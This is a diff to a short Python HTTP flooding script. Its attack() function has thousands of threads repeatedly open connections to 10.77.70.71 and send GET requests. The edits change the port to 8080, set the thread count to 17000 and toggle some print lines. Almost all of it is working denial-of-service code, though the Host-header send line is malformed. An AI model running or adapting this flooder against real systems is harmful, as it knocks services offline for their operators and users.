@@ -1,7 +1,8 @@
 import threading
 import socket, sys, os
 
-port=5000
+port=8080
+threads = 17000
 
 def attack():
     while True:
@@ -9,7 +10,7 @@ def attack():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect(("10.77.70.71", port))
-            print(">> GET / HTTP/1.1")
+            #print(">> GET / HTTP/1.1")
             s.send(b"GET / \r\n")
             s.send(b"Host: http://10.77.70.71:%s \r\n\r\n", port);
 
@@ -22,10 +23,10 @@ def attack():
 
 x=0
 
-while (x<= 50000):
+while (x<=threads):
     x+=1
     #print('THREAD:')
-    #print(x)
+    print(x)
     e1 = threading.Event()
     t1 = threading.Thread(target=attack)
     t1.start()
